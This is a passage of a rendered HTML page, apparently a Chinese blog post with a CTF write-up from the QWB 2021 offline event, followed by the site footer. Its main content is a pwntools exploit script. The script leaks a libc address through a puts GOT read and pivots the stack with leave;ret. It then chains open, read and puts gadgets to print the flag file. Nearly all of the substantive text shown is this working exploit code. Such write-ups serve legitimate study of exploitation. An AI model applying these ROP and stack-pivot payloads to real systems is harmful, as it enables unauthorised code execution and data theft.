class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401527\nc&#x27;)</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000401527</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004017a3</span></span><br><span class="line">pop_rsi_r = <span class="number">0x00000000004017a1</span></span><br><span class="line">pop_rbp = <span class="number">0x000000000040125d</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;exit\x00&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x40168d</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;client send &gt;&gt; &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404100</span>)</span><br><span class="line">payload += p64(<span class="number">0x4015AB</span>) <span class="comment">#myread</span></span><br><span class="line">payload += p64(pop_rbp) + p64(<span class="number">0x404100</span>-<span class="number">8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - <span class="number">554400</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">pop_rsi = <span class="number">0x0000000000027529</span> + libc_base</span><br><span class="line">pop_rdx_r = <span class="number">0x000000000011c371</span> + libc_base</span><br><span class="line">flag_addr = <span class="number">0x404100</span> + <span class="number">0x130</span></span><br><span class="line">syscall_addr = <span class="number">0x0000000000066229</span> + libc_base</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>] + libc_base</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]+ libc_base</span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>]+ libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *%d&#x27;%open_addr)</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># payload = b&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#open </span></span><br><span class="line">payload += p64(pop_rdi) + p64(flag_addr)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x404200</span>)</span><br><span class="line">payload += p64(pop_rdx_r) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line"><span class="comment"># payload += p64(pop_rdi) + p64(1)</span></span><br><span class="line"><span class="comment"># payload += p64(pop_rsi) + p64(0x404200)</span></span><br><span class="line"><span class="comment"># payload += p64(pop_rdx_r) + p64(0x50) + p64(0)</span></span><br><span class="line"><span class="comment"># payload += p64(write_addr)</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x130,b&#x27;\x00&#x27;)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404200</span>)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;./flag\x00&#x27;</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctorrent"><span class="toc-number">1.</span> <span class="toc-text">ctorrent</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bencode"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">bencode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bittorrent-protocol"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">bittorrent protocol</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-go"><span class="toc-number">2.</span> <span class="toc-text">easy_go</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&text=强网杯2021线下"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&title=强网杯2021线下"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&is_video=false&description=强网杯2021线下"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=强网杯2021线下&body=Check out this article: https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&title=强网杯2021线下"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&title=强网杯2021线下"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&title=强网杯2021线下"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&title=强网杯2021线下"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&name=强网杯2021线下&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://coff33h.github.io/2021/07/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2021%E7%BA%BF%E4%B8%8B/&t=强网杯2021线下"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    多喝咖啡
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
